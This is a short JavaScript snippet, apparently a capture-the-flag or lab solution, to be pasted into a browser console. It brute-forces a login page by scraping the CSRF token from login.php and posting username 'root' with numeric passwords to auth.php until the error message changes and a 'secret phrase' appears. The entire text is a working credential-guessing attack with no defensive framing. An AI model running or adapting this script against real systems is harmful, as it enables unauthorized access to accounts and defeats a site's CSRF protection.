// Copy and paste this code into the console
// Then execute makeRequest(1000), and wait till you see the secret phrase

var findFormToken = function(htmlstr) {
	var token;
	$(htmlstr).each(function(index) {
		if ($(this).is('form')) {
			token = $(this).find('input[name=csrf_token]').val();
			return;
		}
	});
	return token;
};

var makeRequest = function(num) {
	if (num > 9999) {
		console.log('Something went wrong');
		return;
	}

	$.get('login.php', function(data) {
		var htmlstr = data.replace(/(\r\n|\n|\r|\t)/gm,"");
		var token = findFormToken(htmlstr);

		$.post('auth.php',
			{ 'username' : 'root', 'password' : num, 'csrf_token' : token },
			function(data) {
				if (data !== 'Username or password was incorrect<br /><a href="login.php">Back to login</a>') {
					console.log(data);
				} else {
					num += 1;
					makeRequest(num);
				}
			}
		);
	});
};